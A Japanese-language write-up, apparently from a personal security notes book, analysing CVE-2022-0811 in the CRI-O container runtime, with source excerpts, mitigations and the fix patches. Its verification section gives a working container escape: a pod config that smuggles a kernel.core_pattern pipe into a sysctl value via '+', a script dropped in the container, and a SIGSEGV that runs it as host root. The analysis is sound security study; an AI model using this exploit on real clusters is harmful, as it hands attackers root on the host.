      <span class="hljs-keyword">if</span> ns == IpcNamespace &amp;&amp; hostIPC {
        <span class="hljs-keyword">return</span> errors.Errorf(nsErrorFmt, s.Key(), ns)
      }
      <span class="hljs-keyword">if</span> ns == NetNamespace &amp;&amp; hostNet {
        <span class="hljs-keyword">return</span> errors.Errorf(nsErrorFmt, s.Key(), ns)
      }
      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
    }
  }
  <span class="hljs-keyword">return</span> errors.Errorf(<span class="hljs-string">&quot;%s not whitelisted&quot;</span>, s.Key())
}
</code></pre>
<p>カーネルパラメータ設定は pinns 内で実装されていて、sysctl の設定値をもとに <code>/proc/sys/</code> 以下のファイルに書き込みを行なっている</p>
<p><a href="https://github.com/cri-o/cri-o/blob/main/pinns/src/sysctl.c" target="_blank">https://github.com/cri-o/cri-o/blob/main/pinns/src/sysctl.c</a></p>
<pre><code class="lang-c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">write_sysctl_to_file</span> <span class="hljs-params">(<span class="hljs-keyword">char</span> * sysctl_key, <span class="hljs-keyword">char</span>* sysctl_value)</span>
</span>{
  <span class="hljs-keyword">if</span> (!sysctl_key || !sysctl_value)
  {
    pwarn (<span class="hljs-string">&quot;sysctl key or value not initialized&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
  }

  <span class="hljs-comment">// replace periods with / to create the sysctl path</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span>* it = sysctl_key; *it; it++)
    <span class="hljs-keyword">if</span> (*it == <span class="hljs-string">&apos;.&apos;</span>)
      *it = <span class="hljs-string">&apos;/&apos;</span>;

  _cleanup_close_ <span class="hljs-keyword">int</span> dirfd = open (<span class="hljs-string">&quot;/proc/sys&quot;</span>, O_DIRECTORY | O_PATH | O_CLOEXEC);
  <span class="hljs-keyword">if</span> (UNLIKELY (dirfd &lt; <span class="hljs-number">0</span>))
  {
    pwarn (<span class="hljs-string">&quot;failed to open /proc/sys&quot;</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
  }

  _cleanup_close_ <span class="hljs-keyword">int</span> fd = openat (dirfd, sysctl_key, O_WRONLY);
  <span class="hljs-keyword">if</span> (UNLIKELY (fd &lt; <span class="hljs-number">0</span>))
  {
    pwarnf (<span class="hljs-string">&quot;failed to open /proc/sys/%s&quot;</span>, sysctl_key);
    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
  }

  <span class="hljs-keyword">int</span> ret = TEMP_FAILURE_RETRY (write (fd, sysctl_value, <span class="hljs-built_in">strlen</span> (sysctl_value)));
  <span class="hljs-keyword">if</span> (UNLIKELY (ret &lt; <span class="hljs-number">0</span>))
  {
    pwarnf (<span class="hljs-string">&quot;failed to write to /proc/sys/%s&quot;</span>, sysctl_key);
    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h2 id="coredump">Coredump</h2>
<p>プロセスが異常終了した時に、プロセスメモリの dump を core ファイルとして出力する<br>ホストの root 権限で実行</p>
<p>設定は /proc/sys/kernel/core_pattern に書かれていて、ファイルの直接編集や、<code>sysctl</code> コマンドで kernel.core_pattern を指定することで設定を変更できる</p>
<pre><code># sysctl -w kernel.core_pattern=&quot;%e-%s.core&quot;
</code></pre><p>core_pattern には dump の出力先パスを指定するが、最初文字がパイプ <code>|</code> の場合は指定パスのプログラムを実行する<br>dump はプログラムに標準入力として渡される</p>
<p>ubuntu (20.04) では、デフォルトで <code>apport</code> というバグレポートツールが指定されている</p>
<pre><code>$ cat /proc/sys/kernel/core_pattern
|/usr/share/apport/apport %p %s %c %d %P %E
</code></pre><p>ファイルサイズの上限は ulimit で設定</p>
<pre><code># cat /proc/self/limits 
Limit                     Soft Limit           Hard Limit           Units     
Max cpu time              unlimited            unlimited            seconds   
Max file size             unlimited            unlimited            bytes     
Max data size             unlimited            unlimited            bytes     
Max stack size            8388608              unlimited            bytes     
Max core file size        0                    unlimited            bytes     
Max resident set          unlimited            unlimited            bytes     
Max processes             3819                 3819                 processes 
Max open files            1024                 1048576              files     
Max locked memory         67108864             67108864             bytes     
Max address space         unlimited            unlimited            bytes     
Max file locks            unlimited            unlimited            locks     
Max pending signals       3819                 3819                 signals   
Max msgqueue size         819200               819200               bytes     
Max nice priority         0                    0                    
Max realtime priority     0                    0                    
Max realtime timeout      unlimited            unlimited            us
</code></pre><h2 id="エクスプロイト">エクスプロイト</h2>
<h3 id="要点">要点</h3>
<ul>
<li>kernel.core_pattern は Namespaced ではないため、ホストとコンテナで同じファイルを参照する<ul>
<li>コンテナ内からは変更不可</li>
<li>pod 起動時に sysctl に kernel.core_pattern を設定できれば、ホストの値も変更できる</li>
</ul>
</li>
<li>CIO-O 内で sysctl のキーを検証しているが、value に <code>+</code> を含む文字列を渡すことでバイパス可能</li>
<li>設定後にプロセスを異常終了させることで、ホストの root 権限で任意コード実行</li>
</ul>
<p>問題となったコード</p>
<pre><code class="lang-go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getSysctlForPinns</span><span class="hljs-params">(sysctls <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">string</span>)</span> <span class="hljs-title">string</span></span> {
  <span class="hljs-comment">// this assumes there&apos;s no sysctl with a `+` in it</span>
  <span class="hljs-keyword">const</span> pinnsSysctlDelim = <span class="hljs-string">&quot;+&quot;</span>
  g := <span class="hljs-built_in">new</span>(bytes.Buffer)
  <span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> sysctls {
    fmt.Fprintf(g, <span class="hljs-string">&quot;&apos;%s=%s&apos;%s&quot;</span>, key, value, pinnsSysctlDelim)  <span class="hljs-comment">// ← &quot;&apos;key1=value1&apos;+&apos;key2=value2&apos;&quot; の形で文字列連結する</span>
  }
  <span class="hljs-keyword">return</span> strings.TrimSuffix(g.String(), pinnsSysctlDelim)
}
</code></pre>
<h3 id="検証">検証</h3>
<p>最初にエクスプロイトコードを配置するコンテナを作成</p>
<pre><code># crio --version
crio version 1.23.1
Version:          1.23.1
GitCommit:        af642cdafed31e4be5dd82e996bb084050c8bb89
GitTreeState:     dirty
BuildDate:        1980-01-01T00:00:00Z
GoVersion:        go1.17.4
Compiler:         gc
Platform:         linux/amd64
Linkmode:         static
BuildTags:        apparmor, exclude_graphdriver_devicemapper, seccomp, selinux
SeccompEnabled:   true
AppArmorEnabled:  true
# crictl runp pod-config.json 
d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a
# crictl create d33614f0b22d3d81bb680ee76eb1882a1b6287bb99515d6505d75e315b01297a container-config.json pod-config.json 
9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123
# crictl start 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123
9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123
# crictl exec -it 9029e03c5ac9abf0475d23981d601df5ed0f9b2ebca4168c4a1f48b2caac6123 bash
root@d33614f0b22d:/# mount | grep overlay
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/containers/storage/overlay/l/73PSGHB33J2RBZXIUVK7SRC4UA,upperdir=/var/lib/containers/storageoverlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff,workdir=/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/work,metacopy=on,volatile)
root@d33614f0b22d:/# echo &apos;#!/bin/sh&apos; &gt; /cmd
root@d33614f0b22d:/# echo &apos;cat /etc/passwd &gt; /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/output&apos; &gt;&gt; cmd
root@d33614f0b22d:/# cat /cmd
#!/bin/sh
cat /etc/passwd &gt; /var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/output
root@d33614f0b22d:/# chmod a+x /cmd
</code></pre><p>kernel.core_pattern を変更する pod を作成<br>pod 作成はエラーになるが、kernel.core_pattern を見ると変更されている</p>
<pre><code># cat pod-config2.json 
{
    &quot;metadata&quot;: {
        &quot;name&quot;: &quot;ubuntu-sandbox2&quot;,
        &quot;namespace&quot;: &quot;default&quot;,
        &quot;attempt&quot;: 1,
        &quot;uid&quot;: &quot;edishd83djaidwnduwk28bcsd&quot;
    },
    &quot;log_directory&quot;: &quot;/tmp&quot;,
    &quot;linux&quot;: {
  &quot;sysctls&quot;: {
      &quot;kernel.shm_rmid_forced&quot;: &quot;1+kernel.core_pattern=|/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #&quot;
  }
    }
}
# crictl runp pod-config2.json 
FATA[0001] run pod sandbox: rpc error: code = Unknown desc = container create failed: write to /proc/sys/kernel/shm_rmid_forced: Invalid argument 
# cat /proc/sys/kernel/core_pattern 
|/var/lib/containers/storage/overlay/4ca77e9bde5220c9b0b54d57f41e56cbed6e873cd5ad67dbcdf43bc3cca1766f/diff/cmd #&apos;
</code></pre><p>プロセスを異常終了させることで Coredump の機能を呼び出し、core_pattern に書き込んだプログラムを実行させる</p>
<pre><code>root@d33614f0b22d:/# tail -f /dev/null &amp;
[1] 17
root@d33614f0b22d:/# ps
    PID TTY          TIME CMD
      4 pts/0    00:00:00 bash
     17 pts/0    00:00:00 tail
     18 pts/0    00:00:00 ps
root@d33614f0b22d:/# kill -SIGSEGV 17
root@d33614f0b22d:/# ls /
bin  boot  cmd  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  output  proc  root  run  sbin  srv  sys  tmp  usr  var
[1]+  Segmentation fault      (core dumped) tail -f /dev/null
root@d33614f0b22d:/# cat /output 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
...
</code></pre><h2 id="回避策">回避策</h2>
<ul>
<li>CRI-O のアップデート (非推奨だが v1.18 以下へのダウングレードも可)</li>
<li>OPA 等のポリシーを設定する</li>
<li>PSP で sysctls を全てブロックする</li>
<li>pinns の <code>-s</code> を除去するラッパーを用意し、crio.conf の pinns_path に設定する</li>
</ul>
<h2 id="　修正パッチ">　修正パッチ</h2>
<h3 id="internalconfignsmgrnsmgrgo">internal/config/nsmgr/nsmgr.go</h3>
<p><a href="https://github.com/cri-o/cri-o/commit/05c443b06356c2dbf9d30060f362279c6b8ac1a1" target="_blank">https://github.com/cri-o/cri-o/commit/05c443b06356c2dbf9d30060f362279c6b8ac1a1</a></p>
<p><code>+</code> に対してバリデーションを追加</p>
<pre><code class="lang-go">  <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *NamespaceManager)</span> <span class="hljs-title">NewPodNamespaces</span><span class="hljs-params">(cfg *PodNamespacesConfig)</span> <span class="hljs-params">([]Namespace, error)</span></span> {
    ...

    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(cfg.Sysctls) != <span class="hljs-number">0</span> {
-     pinnsArgs = <span class="hljs-built_in">append</span>(pinnsArgs, <span class="hljs-string">&quot;-s&quot;</span>, getSysctlForPinns(cfg.Sysctls))
+     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)
+     <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
+       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.Wrapf(err, <span class="hljs-string">&quot;invalid sysctl&quot;</span>)
+     }
+     pinnsArgs = <span class="hljs-built_in">append</span>(pinnsArgs, <span class="hljs-string">&quot;-s&quot;</span>, pinnsSysctls)
    }

    ...
  }

- <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getSysctlForPinns</span><span class="hljs-params">(sysctls <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">string</span>)</span> <span class="hljs-title">string</span></span> {
-   <span class="hljs-comment">// this assumes there&apos;s no sysctl with a `+` in it</span>
+ <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getSysctlForPinns</span><span class="hljs-params">(sysctls <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">string</span>)</span> <span class="hljs-params">(<span class="hljs-keyword">string</span>, error)</span></span> {
+   <span class="hljs-comment">// This assumes there&apos;s no valid sysctl value with a `+` in it</span>
+   <span class="hljs-comment">// and as such errors if one is found.</span>
    <span class="hljs-keyword">const</span> pinnsSysctlDelim = <span class="hljs-string">&quot;+&quot;</span>
    g := <span class="hljs-built_in">new</span>(bytes.Buffer)
    <span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> sysctls {
+     <span class="hljs-keyword">if</span> strings.Contains(key, pinnsSysctlDelim) || strings.Contains(value, pinnsSysctlDelim) {
+       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, errors.Errorf(<span class="hljs-string">&quot;&apos;%s=%s&apos; is invalid: %s found yet should not be present&quot;</span>, key, value, pinnsSysctlDelim)
+     }
      fmt.Fprintf(g, <span class="hljs-string">&quot;&apos;%s=%s&apos;%s&quot;</span>, key, value, pinnsSysctlDelim)
    }
-   <span class="hljs-keyword">return</span> strings.TrimSuffix(g.String(), pinnsSysctlDelim)
+   <span class="hljs-keyword">return</span> strings.TrimSuffix(g.String(), pinnsSysctlDelim), <span class="hljs-literal">nil</span>
  }
</code></pre>
<p><a href="https://github.com/cri-o/cri-o/commit/1af1f8af2c7e23525102dffbf0899b69e34ed3d2" target="_blank">https://github.com/cri-o/cri-o/commit/1af1f8af2c7e23525102dffbf0899b69e34ed3d2</a></p>
<p>文字列の連結をやめ、<code>-s</code> をパラメータ毎に設定する</p>
<pre><code class="lang-go">  <span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *NamespaceManager)</span> <span class="hljs-title">NewPodNamespaces</span><span class="hljs-params">(cfg *PodNamespacesConfig)</span> <span class="hljs-params">([]Namespace, error)</span></span> {
    ...

-   <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(cfg.Sysctls) != <span class="hljs-number">0</span> {
-     pinnsSysctls, err := getSysctlForPinns(cfg.Sysctls)
-     <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
-       <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.Wrapf(err, <span class="hljs-string">&quot;invalid sysctl&quot;</span>)
-     }
-     pinnsArgs = <span class="hljs-built_in">append</span>(pinnsArgs, <span class="hljs-string">&quot;-s&quot;</span>, pinnsSysctls)
+   <span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> cfg.Sysctls {
+     pinnsArgs = <span class="hljs-built_in">append</span>(pinnsArgs, <span class="hljs-string">&quot;-s&quot;</span>, fmt.Sprintf(<span class="hljs-string">&quot;%s=%s&quot;</span>, key, value))
    }

    ...
  }
</code></pre>
<h2 id="他のコンテナランタイムの実装">他のコンテナランタイムの実装</h2>
<p>containerd では sysctls の検証を行なっていない<br>runc にそのまま渡し、runc 内で検証している</p>
<p><a href="https://github.com/opencontainers/runc/blob/main/libcontainer/configs/validate/validator.go" target="_blank">https://github.com/opencontainers/runc/blob/main/libcontainer/configs/validate/validator.go</a></p>
<pre><code class="lang-go"><span class="hljs-comment">// sysctl validates that the specified sysctl keys are valid or not.</span>
<span class="hljs-comment">// /proc/sys isn&apos;t completely namespaced and depending on which namespaces</span>
<span class="hljs-comment">// are specified, a subset of sysctls are permitted.</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(v *ConfigValidator)</span> <span class="hljs-title">sysctl</span><span class="hljs-params">(config *configs.Config)</span> <span class="hljs-title">error</span></span> {
  validSysctlMap := <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">bool</span>{
    <span class="hljs-string">&quot;kernel.msgmax&quot;</span>:          <span class="hljs-literal">true</span>,
    <span class="hljs-string">&quot;kernel.msgmnb&quot;</span>:          <span class="hljs-literal">true</span>,
    <span class="hljs-string">&quot;kernel.msgmni&quot;</span>:          <span class="hljs-literal">true</span>,
    <span class="hljs-string">&quot;kernel.sem&quot;</span>:             <span class="hljs-literal">true</span>,
    <span class="hljs-string">&quot;kernel.shmall&quot;</span>:          <span class="hljs-literal">true</span>,
    <span class="hljs-string">&quot;kernel.shmmax&quot;</span>:          <span class="hljs-literal">true</span>,
    <span class="hljs-string">&quot;kernel.shmmni&quot;</span>:          <span class="hljs-literal">true</span>,
    <span class="hljs-string">&quot;kernel.shm_rmid_forced&quot;</span>: <span class="hljs-literal">true</span>,
  }

  <span class="hljs-keyword">for</span> s := <span class="hljs-keyword">range</span> config.Sysctl {
    <span class="hljs-keyword">if</span> validSysctlMap[s] || strings.HasPrefix(s, <span class="hljs-string">&quot;fs.mqueue.&quot;</span>) {
      <span class="hljs-keyword">if</span> config.Namespaces.Contains(configs.NEWIPC) {
        <span class="hljs-keyword">continue</span>
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;sysctl %q is not allowed in the hosts ipc namespace&quot;</span>, s)
      }
    }
    <span class="hljs-keyword">if</span> strings.HasPrefix(s, <span class="hljs-string">&quot;net.&quot;</span>) {
      <span class="hljs-keyword">if</span> config.Namespaces.Contains(configs.NEWNET) {
        <span class="hljs-keyword">continue</span>
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;sysctl %q is not allowed in the hosts network namespace&quot;</span>, s)
      }
    }
    <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;sysctl %q is not in a separate kernel namespace&quot;</span>, s)
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
}
</code></pre>
<h2 id="参考">参考</h2>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0811" target="_blank">https://nvd.nist.gov/vuln/detail/CVE-2022-0811</a></p>
<p><a href="https://blog.aquasec.com/cve-2022-0811-cri-o-vulnerability" target="_blank">https://blog.aquasec.com/cve-2022-0811-cri-o-vulnerability</a></p>
<p><a href="https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/" target="_blank">https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/</a></p>
<p><a href="https://github.com/cri-o/cri-o/security/advisories/GHSA-6x2m-w449-qwx7" target="_blank">https://github.com/cri-o/cri-o/security/advisories/GHSA-6x2m-w449-qwx7</a></p>
<p><a href="https://kubernetes.io/docs/tasks/administer-cluster/sysctl-cluster/" target="_blank">https://kubernetes.io/docs/tasks/administer-cluster/sysctl-cluster/</a></p>
<p><a href="https://pwning.systems/posts/escaping-containers-for-fun/" target="_blank">https://pwning.systems/posts/escaping-containers-for-fun/</a></p>
<p><a href="https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts" target="_blank">https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts</a></p>
<p><a href="https://valinux.hatenablog.com/entry/20210721" target="_blank">https://valinux.hatenablog.com/entry/20210721</a></p>
<p><a href="https://qiita.com/rarul/items/d33b664c8414f065e65e" target="_blank">https://qiita.com/rarul/items/d33b664c8414f065e65e</a></p>
<p><a href="https://man7.org/linux/man-pages/man5/core.5.html" target="_blank">https://man7.org/linux/man-pages/man5/core.5.html</a></p>
<p><a href="https://lwn.net/Articles/280959/" target="_blank">https://lwn.net/Articles/280959/</a></p>
<p><a href="https://wiki.ubuntu.com/Apport" target="_blank">https://wiki.ubuntu.com/Apport</a></p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="cve-2022-0492.html" class="navigation navigation-prev " aria-label="Previous page: CVE-2022-0492">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="spring4shell.html" class="navigation navigation-next " aria-label="Next page: Srping4shell">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"CVE-2022-0811","level":"1.18.4","depth":2,"next":{"title":"Srping4shell","level":"1.18.5","depth":2,"path":"secreports/spring4shell.md","ref":"secreports/spring4shell.md","articles":[]},"previous":{"title":"CVE-2022-0492","level":"1.18.3","depth":2,"path":"secreports/cve-2022-0492.md","ref":"secreports/cve-2022-0492.md","articles":[]},"dir":"ltr"},"config":{"plugins":[],"root":"./src","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"secreports/cve-2022-0811.md","mtime":"2022-05-19T07:46:47.481Z","type":"markdown"},"gitbook":{"version":"3.7.1","time":"2022-05-19T07:47:02.517Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <noscript>
        <style>
            .honkit-cloak {
                display: block !important;
            }
        </style>
    </noscript>
    <script>
        // Restore sidebar state as critical path for prevent layout shift
        function __init__getSidebarState(defaultValue){
            var baseKey = "";
            var key = baseKey + ":sidebar";
            try {
                var value = localStorage[key];
                if (value === undefined) {
                    return defaultValue;
                }
                var parsed = JSON.parse(value);
                return parsed == null ? defaultValue : parsed;
            } catch (e) {
                return defaultValue;
            }
        }
        function __init__restoreLastSidebarState() {
            var isMobile = window.matchMedia("(max-width: 600px)").matches;
            if (isMobile) {
                // Init last state if not mobile
                return;
            }
            var sidebarState = __init__getSidebarState(true);
            var book = document.querySelector(".book");
            // Show sidebar if it enabled
            if (sidebarState && book) {
                book.classList.add("without-animation", "with-summary");
            }
        }

        try {
            __init__restoreLastSidebarState();
        } finally {
            var book = document.querySelector(".book");
            book.classList.remove("honkit-cloak");
        }
    </script>
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

